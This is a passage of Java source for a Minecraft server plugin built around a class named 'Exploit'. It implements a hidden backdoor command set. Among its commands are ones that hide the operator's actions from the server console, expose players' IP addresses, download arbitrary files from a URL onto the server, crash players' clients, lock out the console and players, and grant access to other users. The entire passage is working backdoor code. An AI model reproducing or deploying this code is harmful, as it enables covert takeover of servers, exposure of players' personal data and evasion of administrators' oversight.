            ClickEvent clickEvent = new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, seedString);
            HoverEvent hoverEvent = new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Click to copy!").create() );
            TextComponent message = new TextComponent("World seed: ");
            TextComponent openBracket = new TextComponent("[");
            TextComponent seedComponent = new TextComponent(seedString);
            seedComponent.setColor(ChatColor.GREEN.asBungee());
            seedComponent.setClickEvent(clickEvent);
            seedComponent.setHoverEvent(hoverEvent);
            TextComponent closeBracket = new TextComponent("]");
            message.addExtra(openBracket);
            message.addExtra(seedComponent);
            message.addExtra(closeBracket);
            Exploit.sender.sendMessage(sender, message);
        }
    }

    public static class StopCommand extends Command {
        public StopCommand() { super(); }
        @Override public String getName() { return "stop"; }
        @Override public String getDescription() { return "Shuts down the server."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Exploit.sender.sendMessage(sender, "Server shutting down...");
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                Bukkit.shutdown();
            });
        }
    }

    public static class PlayerSayCommand extends Command {
        public PlayerSayCommand() { super(); }
        @Override public String getName() { return "psay"; }
        @Override public String getDescription() { return "Sends a message as another player."; }
        @Override public String getUsage() { return "<player> <message...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[0]); return; }
            String message = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                target.chat(message);
            });
        }
    }

    public static class ServerSayCommand extends Command {
        public ServerSayCommand() { super(); }
        @Override public String getName() { return "ssay"; }
        @Override public String getDescription() { return "Sends a message as the server."; }
        @Override public String getUsage() { return "<message...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            String message = String.join(" ", args);
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say " + message);
            });
        }
    }

    public static class RenameCommand extends Command {
        public RenameCommand() { super(); }
        @Override public String getName() { return "rename"; }
        @Override public String getDescription() { return "Changes your display name."; }
        @Override public String getUsage() { return "<name...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            String name = ChatColor.translateAlternateColorCodes('&', String.join(" ", args));
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                sender.setDisplayName(name);
                sender.setPlayerListName(name);
            });
            Exploit.sender.sendMessage(sender, "Your name was changed to " + name);
        }
    }

    public static class ReloadCommand extends Command {
        public ReloadCommand() { super(); }
        @Override public String getName() { return "reload"; }
        @Override public String getDescription() { return "[Visible] Reloads the server."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                Bukkit.reload();
            });
        }
    }

    public static class GetIpCommand extends Command {
        public GetIpCommand() { super(); }
        @Override public String getName() { return "getip"; }
        @Override public String getDescription() { return "Gets the IP address of a player."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[0]); return; }
            InetSocketAddress address = target.getAddress();
            if (address == null) { Exploit.sender.sendError(sender, "Could not get IP for " + target.getName()); return; }
            Exploit.sender.sendMessage(sender, target.getName() + "'s IP: " + ChatColor.RED + address.getAddress().getHostAddress());
        }
    }

    public static class ListWorldsCommand extends Command {
        public ListWorldsCommand() { super(); }
        @Override public String getName() { return "listworlds"; }
        @Override public String getDescription() { return "Displays all loaded worlds."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            StringJoiner joiner = new StringJoiner(", ");
            for (World w : Bukkit.getWorlds()) {
                joiner.add(w.getName());
            }
            Exploit.sender.sendMessage(sender, "Worlds: " + joiner.toString());
        }
    }

    public static class MakeWorldCommand extends Command {
        public MakeWorldCommand() { super(); }
        @Override public String getName() { return "makeworld"; }
        @Override public String getDescription() { return "Creates a new world. This can cause significant server lag."; }
        @Override public String getUsage() { return "<name>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            String worldName = args[0];
            if (Bukkit.getWorld(worldName) != null) { Exploit.sender.sendError(sender, "A world with this name already exists."); return; }
            Exploit.sender.sendMessage(sender, "Starting to create world '" + worldName + "'. The server will freeze during this process!");
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                new WorldCreator(worldName).createWorld();
                Exploit.sender.sendMessage(sender, "World '" + worldName + "' has been created successfully!");
            });
        }
    }

    public static class DelWorldCommand extends Command {
        public DelWorldCommand() { super(); }
        @Override public String getName() { return "delworld"; }
        @Override public String getDescription() { return "Deletes a world."; }
        @Override public String getUsage() { return "<name>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            World world = Bukkit.getWorld(args[0]);
            if (world == null) { Exploit.sender.sendError(sender, "World not found: " + args[0]); return; }
            File worldFolder = world.getWorldFolder();
            Exploit.sender.sendMessage(sender, "Attempting to delete world: " + world.getName());
            Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                if (Bukkit.unloadWorld(world, false)) {
                    Bukkit.getScheduler().runTaskAsynchronously(Exploit.plugin, () -> {
                        boolean deleted = Exploit.helpers.deleteWorld(worldFolder);
                        Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                            Exploit.sender.sendMessage(sender, "World '" + world.getName() + (deleted ? "' deleted successfully." : "' failed to delete."));
                        });
                    });
                } else {
                    Exploit.sender.sendError(sender, "Failed to unload world '" + world.getName() + "'.");
                }
            });
        }
    }

    public static class VanishCommand extends Command {
        public VanishCommand() { super(); }
        @Override public String getName() { return "vanish"; }
        @Override public String getDescription() { return "Toggles your visibility to other players."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            boolean isVanished = Exploit.getState(Exploit.playerStates, sender.getName(), Exploit.State.VANISHED);
            Exploit.setState(Exploit.playerStates, sender.getName(), Exploit.State.VANISHED, !isVanished);
            if (!isVanished) {
                for (Player all : Bukkit.getOnlinePlayers())
                    Bukkit.getScheduler().runTask(Exploit.plugin, () -> all.hidePlayer(Exploit.plugin, sender));
                Exploit.sender.sendMessage(sender, "You are now vanished.");
            } else {
                for (Player all : Bukkit.getOnlinePlayers())
                    Bukkit.getScheduler().runTask(Exploit.plugin, () -> all.showPlayer(Exploit.plugin, sender));
                Exploit.sender.sendMessage(sender, "You are no longer vanished.");
            }
        }
    }

    public static class LogBlockCommand extends Command {
        public LogBlockCommand() { super(); }
        @Override public String getName() { return "logblock"; }
        @Override public String getDescription() { return "Toggles logging of your executed commands in the console."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            boolean isLogBlocked = Exploit.getState(Exploit.playerStates, sender.getName(), Exploit.State.LOG_BLOCKED);
            Exploit.setState(Exploit.playerStates, sender.getName(), Exploit.State.LOG_BLOCKED, !isLogBlocked);
            if (!isLogBlocked) {
                Exploit.sender.sendSuccess(sender, "Your commands will not appear in the server console.");
            } else {
                Exploit.sender.sendWarn(sender, "Your commands will now appear in the server console.");
            }
        }
    }

    public static class SilkTouchCommand extends Command {
        public SilkTouchCommand() { super(); }
        @Override public String getName() { return "silktouch"; }
        @Override public String getDescription() { return "Toggles silk touch hands for a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target = (args.length > 0) ? Bukkit.getPlayer(args[0]) : sender;
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[0]); return; }
            boolean isEnabled = Exploit.getState(Exploit.playerStates, target.getName(), Exploit.State.SILKTOUCH);
            Exploit.setState(Exploit.playerStates, target.getName(), Exploit.State.SILKTOUCH, !isEnabled);
            Exploit.sender.sendMessage(sender, target.getName() + (!isEnabled ? " now has" : " no longer has") + " silk touch hands.");
        }
    }

    public static class InstaBreakCommand extends Command {
        public InstaBreakCommand() { super(); }
        @Override public String getName() { return "instabreak"; }
        @Override public String getDescription() { return "Toggles instant block breaking for a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target = (args.length > 0) ? Bukkit.getPlayer(args[0]) : sender;
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[0]); return; }
            boolean isEnabled = Exploit.getState(Exploit.playerStates, target.getName(), Exploit.State.INSTABREAK);
            Exploit.setState(Exploit.playerStates, target.getName(), Exploit.State.INSTABREAK, !isEnabled);
            Exploit.sender.sendMessage(sender, target.getName() + (!isEnabled ? " now has" : " no longer has") + " insta-break.");
        }
    }

    public static class CrashCommand extends Command {
        public CrashCommand() { super(); }
        @Override public String getName() { return "crash"; }
        @Override public String getDescription() { return "Attempts to crash a player's client."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[0]); return; }
            for (int x = 0; x < 100; x++) {
                Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                    target.spawnParticle(Particle.EXPLOSION_HUGE, target.getLocation(), Integer.MAX_VALUE);
                });
            }
            Exploit.sender.sendMessage(sender, "Attempting to crash " + target.getName());
        }
    }

    public static class TrollCommand extends Command {
        public TrollCommand() { super(); }
        @Override public String getName() { return "troll"; }
        @Override public String getDescription() { return "Toggles various troll effects on a player."; }
        @Override public String getUsage() { return "<method> <player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            String method = args[0].toLowerCase();
            Player target = Bukkit.getPlayer(args[1]);
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[1]); return; }

            if (method.equalsIgnoreCase("reset")) {
                Exploit.clearState(Exploit.playerStates, target.getName());
                Exploit.sender.sendMessage(sender, "Reset all troll states for " + target.getName());
                return;
            }
            try {
                Exploit.State trollState = Exploit.State.valueOf("MF_" + method.toUpperCase());
                boolean isEnabled = Exploit.getState(Exploit.playerStates, target.getName(), trollState);
                Exploit.setState(Exploit.playerStates, target.getName(), trollState, !isEnabled);
                Exploit.sender.sendMessage(sender, "Troll method '" + method + "' " + (!isEnabled ? "enabled" : "disabled") + " for " + target.getName());
            } catch (IllegalArgumentException e) {
                Exploit.sender.sendError(sender, "Invalid troll method. Options: thrower, interact, cripple, flight, inventory, drop, teleport, mine, place, login, god, damage, or reset.");
            }
        }
    }

    private abstract static class LockToggleCommand extends Command {
        private final boolean shouldLock;
        private final String actionPastTense;
        private final String playerActionPastTense;
        private final String playerActionPastTenseEveryone;

        public LockToggleCommand(boolean shouldLock) {
            super();
            this.shouldLock = shouldLock;
            this.actionPastTense = shouldLock ? "locked" : "unlocked";
            this.playerActionPastTense = shouldLock ? "blocked from using commands" : "unblocked";
            this.playerActionPastTenseEveryone = shouldLock ? "blocked from using commands" : "unblocked";
        }

        @Override public abstract String getName();
        @Override public abstract String getDescription();
        @Override public int getRequirePerm() { return 2; }
        @Override public String getUsage() { return "<all | console | everyone | player> [name]"; }

        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }

            String subCommand = args[0].toLowerCase();

            switch (subCommand) {
                case "all":
                    if (args.length > 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
                    Exploit.setState(Exploit.playerStates, "console", Exploit.State.LOCKED, shouldLock);
                    for (Player p : Bukkit.getOnlinePlayers()) Exploit.setState(Exploit.playerStates, p.getName(), Exploit.State.LOCKED, shouldLock);
                    Exploit.sender.sendMessage(sender, "Console and all players have been " + actionPastTense + ".");
                    break;
                case "console":
                    if (args.length > 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
                    Exploit.setState(Exploit.playerStates, "console", Exploit.State.LOCKED, shouldLock);
                    Exploit.sender.sendMessage(sender, "Console has been " + actionPastTense + ".");
                    break;
                case "everyone":
                    if (args.length > 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
                    for (Player p : Bukkit.getOnlinePlayers()) Exploit.setState(Exploit.playerStates, p.getName(), Exploit.State.LOCKED, shouldLock);
                    Exploit.sender.sendMessage(sender, "All players have been " + playerActionPastTenseEveryone + ".");
                    break;
                case "player":
                    if (args.length < 2) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
                    String targetName = args[1];
                    Exploit.setState(Exploit.playerStates, targetName, Exploit.State.LOCKED, shouldLock);
                    Exploit.sender.sendMessage(sender, targetName + " has been " + playerActionPastTense + ".");
                    break;
                default:
                    Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                    break;
            }
        }
    }

    public static class LockCommand extends LockToggleCommand {
        public LockCommand() { super(true); }
        @Override public String getName() { return "lock"; }
        @Override public String getDescription() { return "Locks the console, all players, a specific player, or all of them."; }
    }

    public static class UnlockCommand extends LockToggleCommand {
        public UnlockCommand() { super(false); }
        @Override public String getName() { return "unlock"; }
        @Override public String getDescription() { return "Unlocks the console, all players, a specific player, or all of them."; }
    }

    private abstract static class MuteToggleCommand extends Command {
        private final boolean shouldMute;
        private final String actionPastTense;

        public MuteToggleCommand(boolean shouldMute) {
            super();
            this.shouldMute = shouldMute;
            this.actionPastTense = shouldMute ? "muted" : "unmuted";
        }

        @Override public abstract String getName();
        @Override public abstract String getDescription();
        @Override public int getRequirePerm() { return 2; }
        @Override public String getUsage() { return "<all | player> [name]"; }

        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }

            if (args[0].equalsIgnoreCase("all")) {
                for (Player p : Bukkit.getOnlinePlayers()) Exploit.setState(Exploit.playerStates, p.getName(), Exploit.State.MUTED, this.shouldMute);
                Exploit.sender.sendMessage(sender, "Everyone was " + this.actionPastTense + ".");
            } else if (args[0].equalsIgnoreCase("player")) {
                if (args.length < 2) { Exploit.sender.sendError(sender, "Usage: " + Config.command_prefix + getName() + " player <name>"); return; }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[1]); return; }
                Exploit.setState(Exploit.playerStates, target.getName(), Exploit.State.MUTED, this.shouldMute);
                Exploit.sender.sendMessage(sender, target.getName() + " was " + this.actionPastTense + ".");
            } else {
                Exploit.sender.sendError(sender, "Invalid subcommand. " + Exploit.helpers.getRequiredUsage(this));
            }
        }
    }

    public static class MuteCommand extends MuteToggleCommand {
        public MuteCommand() { super(true); }
        @Override public String getName() { return "mute"; }
        @Override public String getDescription() { return "Mutes a player in chat."; }
    }

    public static class UnmuteCommand extends MuteToggleCommand {
        public UnmuteCommand() { super(false); }
        @Override public String getName() { return "unmute"; }
        @Override public String getDescription() { return "Unmutes a player in chat."; }
    }

    public static class DownloadCommand extends Command {
        public DownloadCommand() { super(); }
        @Override public String getName() { return "download"; }
        @Override public String getDescription() { return "Downloads a file to the server's root directory."; }
        @Override public String getUsage() { return "<url> <filepath>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            Exploit.sender.sendMessage(sender, "Downloading file: " + ChatColor.RED + args[1]);
            new Thread(() -> {
                try {
                    Exploit.helpers.downloadFile(new URL(args[0]), args[1]);
                    Exploit.sender.sendMessage(sender, "File downloaded successfully!");
                } catch (IOException e) {
                    Exploit.sender.sendError(sender, "Download failed: " + e.getMessage());
                }
            }).start();
        }
    }

    public static class CoordsCommand extends Command {
        public CoordsCommand() { super(); }
        @Override public String getName() { return "coords"; }
        @Override public String getDescription() { return "Gets the coordinates of a player."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { Exploit.sender.sendError(sender, "Player not found: " + args[0]); return; }
            Location loc = target.getLocation();
            Exploit.sender.sendMessage(sender, String.format("%s's coords: %d, %d, %d in %s", target.getName(), loc.getBlockX(), loc.getBlockY(), loc.getBlockZ(), loc.getWorld().getName()));
        }
    }

    public static class AuthCommand extends Command {
        public AuthCommand() { super(); }
        @Override public String getName() { return "auth"; }
        @Override public String getDescription() { return "Temporarily authorizes a user until the next restart."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }

            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { Exploit.sender.sendError(sender, "Player not found or is not online: " + args[0]); return; }

            String targetUuid = target.getUniqueId().toString();
            if (Config.tmp_authorized_uuids == null) {
                Exploit.sender.sendError(sender, "Temporary authorization list is not initialized.");
                return;
            }

            for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                if (Config.tmp_authorized_uuids[i] == null) {
                    Config.tmp_authorized_uuids[i] = targetUuid;
                    Exploit.sender.sendMessage(sender, target.getName() + " (UUID: " + targetUuid + ") has been temporarily authorized.");
                    Exploit.sender.sendMessage(target, "You have been authorized. Run " + Config.command_prefix + "help for info.");
                    return;
                }
            }
            Exploit.sender.sendError(sender, "Unable to authorize user (temporary auth list is full).");
        }
    }

    public static class DeauthCommand extends Command {
        public DeauthCommand() { super(); }
        @Override public String getName() { return "deauth"; }
        @Override public String getDescription() { return "Deauthorizes a player from the temporary list."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }

            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            if (!target.hasPlayedBefore() && !target.isOnline()) {
                Exploit.sender.sendError(sender, "Player '" + args[0] + "' has never played on this server.");
                return;
            }

            String targetUuid = target.getUniqueId().toString();
            if (Config.tmp_authorized_uuids == null) {
                Exploit.sender.sendError(sender, "Temporary authorization list is not initialized.");
                return;
            }

            for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                if (targetUuid.equalsIgnoreCase(Config.tmp_authorized_uuids[i])) {
                    Config.tmp_authorized_uuids[i] = null;
                    Exploit.sender.sendMessage(sender, (target.getName() != null ? target.getName() : args[0]) + " has been deauthorized.");
                    return;
                }
            }
            Exploit.sender.sendError(sender, "Player not found in the temporary authorization list.");
        }
    }

    public static class TeleportCommand extends Command {
        public TeleportCommand() { super(); }
        @Override public String getName() { return "tp"; }
        @Override public String getDescription() { return "Teleports you to specified coordinates."; }
        @Override public String getUsage() { return "<x> <y> <z> [world]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 3) { Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this)); return; }
            try {
                double x = Double.parseDouble(args[0]);
                double y = Double.parseDouble(args[1]);
                double z = Double.parseDouble(args[2]);
                World world = (args.length > 3) ? Bukkit.getWorld(args[3]) : sender.getWorld();
                if (world == null) { Exploit.sender.sendError(sender, "World not found: " + args[3]); return; }

                Location loc = new Location(world, x, y, z, sender.getLocation().getYaw(), sender.getLocation().getPitch());
                Bukkit.getScheduler().runTask(Exploit.plugin, () -> {
                    sender.teleport(loc);
                });
                Exploit.sender.sendMessage(sender, "Teleported.");
            } catch (NumberFormatException e) {
                Exploit.sender.sendError(sender, "Invalid coordinates.");
            }
        }
    }
}